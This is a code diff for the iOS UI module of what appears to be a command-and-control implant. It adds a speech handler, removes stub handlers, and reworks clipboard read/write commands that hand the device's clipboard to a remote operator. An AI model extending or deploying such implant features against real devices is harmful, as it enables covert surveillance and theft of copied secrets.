@@ -27,10 +27,8 @@
 
 #import <objc/runtime.h>
 #import <AVFoundation/AVFoundation.h>
-#import <UIKit/UIPasteboard.h>
 #import <MediaPlayer/MediaPlayer.h>
 #import <CoreFoundation/CoreFoundation.h>
-#import <UIKit/UIKit.h>
 
 #include <mach/port.h>
 
@@ -51,22 +49,10 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
                        API_CALL + 1)
-#define UI_BACKLIGHT_SET \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       UI_BASE, \
-                       API_CALL + 2)    /* TODO */
-#define UI_KILL_APPS \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       UI_BASE, \
-                       API_CALL + 3)    /* TODO */
-#define UI_KILL_APP \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       UI_BASE, \
-                       API_CALL + 4)    /* TODO */
 #define UI_SAY \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
-                       API_CALL + 5)    /* TODO */
+                       API_CALL + 5)
 #define UI_OPEN_URL \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
@@ -109,6 +95,45 @@ int SBSOpenSensitiveURLAndUnlock(CFURLRef url, char flags);
 -(BOOL)setVolumeTo:(float)volume forCategory:(id)category;
 -(BOOL)getVolume:(float *)volume forCategory:(id)category;
 @end
+
+static tlv_pkt_t *ui_say(c2_t *c2)
+{
+    char phrase[1024];
+
+    AVSpeechSynthesizer *synthesizer;
+    AVSpeechUtterance* utterance;
+
+    NSDictionary *languageDic;
+
+    NSString *phraseSay;
+    NSString *language;
+    NSString *countryCode;
+    NSString *languageCode;
+    NSString *languageForVoice;
+
+    tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, phrase);
+
+    @autoreleasepool
+    {
+        phraseSay = [NSString stringWithUTF8String:phrase];
+
+        synthesizer = [[AVSpeechSynthesizer alloc] init];
+        utterance = [AVSpeechUtterance speechUtteranceWithString:phraseSay];
+
+        utterance.rate = 0.5;
+
+        language = [[NSLocale currentLocale] localeIdentifier];
+        languageDic = [NSLocale componentsFromLocaleIdentifier:language];
+        countryCode = [languageDic objectForKey:NSLocaleCountryCode];
+        languageCode = [languageDic objectForKey:NSLocaleLanguageCode];
+        languageForVoice = [[NSString stringWithFormat:@"%@-%@", [languageCode lowercaseString], countryCode] lowercaseString];
+
+        utterance.voice = [AVSpeechSynthesisVoice voiceWithLanguage:languageForVoice];
+        [synthesizer speakUtterance:utterance];
+    }
+
+    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+}
 
 static tlv_pkt_t *ui_app_list(c2_t *c2)
 {
@@ -221,8 +246,6 @@ static tlv_pkt_t *ui_volume_get(c2_t *c2)
     }
 
     value = delta * 10;
-    log_debug("* Volume level: %f %d\n", delta, value);
-
     result = api_craft_tlv_pkt(API_CALL_SUCCESS);
     tlv_pkt_add_int(result, TLV_TYPE_INT, value);
 
@@ -237,12 +260,9 @@ static tlv_pkt_t *ui_clipboard_set(c2_t *c2)
 
     tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, text);
 
-    @autoreleasepool
-    {
-        clipboardText = [NSString stringWithUTF8String:text];
-        pasteboard = [UIPasteboard generalPasteboard];
-        [pasteboard setValue:clipboardText forPasteboardType: @"public.plain-text"];
-    }
+    clipboardText = [NSString stringWithUTF8String:text];
+    pasteboard = [NSClassFromString(@"UIPasteboard") generalPasteboard];
+    [pasteboard setValue:clipboardText forPasteboardType:@"public.plain-text"];
 
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
@@ -255,58 +275,15 @@ static tlv_pkt_t *ui_clipboard_get(c2_t *c2)
 
     result = api_craft_tlv_pkt(API_CALL_SUCCESS);
 
-    @autoreleasepool
-    {
-        pasteboard = [UIPasteboard generalPasteboard];
-        text = (char *)[pasteboard.string UTF8String];
+    pasteboard = [NSClassFromString(@"UIPasteboard") generalPasteboard];
+    text = (char *)[pasteboard.string UTF8String];
 
-        if (text != NULL)
-        {
-            tlv_pkt_add_string(result, TLV_TYPE_STRING, text);
-        }
+    if (text != NULL)
+    {
+        tlv_pkt_add_string(result, TLV_TYPE_STRING, text);
     }
 
     return result;
-}
-
-static tlv_pkt_t *ui_backlight_set(c2_t *c2)
-{
-    int level;
-    float delta;
-
-    tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &level);
-    delta = level * 0.1;
-
-    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
-}
-
-static tlv_pkt_t *ui_kill_apps(c2_t *c2)
-{
-    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
-}
-
-static tlv_pkt_t *ui_kill_app(c2_t *c2)
-{
-    char bundle_id[128];
-    NSString *bundleID;
-
-    tlv_pkt_add_string(c2->request, TLV_TYPE_STRING, bundle_id);
-
-    bundleID = [NSString stringWithUTF8String:bundle_id];
-    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
-}
-
-static tlv_pkt_t *ui_say(c2_t *c2)
-{
-    char phrase[1024];
-    NSString *phraseSay;
-    NSError *error;
-
-    tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, phrase);
-
-    phraseSay = [NSString stringWithUTF8String:phrase];
-
-    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
 }
 
 static tlv_pkt_t *ui_screenshot(c2_t *c2)
@@ -328,9 +305,6 @@ void register_ui_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, UI_CLIPBOARD_SET, ui_clipboard_set);
     api_call_register(api_calls, UI_CLIPBOARD_GET, ui_clipboard_get);
-    api_call_register(api_calls, UI_BACKLIGHT_SET, ui_backlight_set);
-    api_call_register(api_calls, UI_KILL_APPS, ui_kill_apps);
-    api_call_register(api_calls, UI_KILL_APP, ui_kill_app);
     api_call_register(api_calls, UI_SAY, ui_say);
     api_call_register(api_calls, UI_OPEN_URL, ui_open_url);
     api_call_register(api_calls, UI_OPEN_APP, ui_open_app);
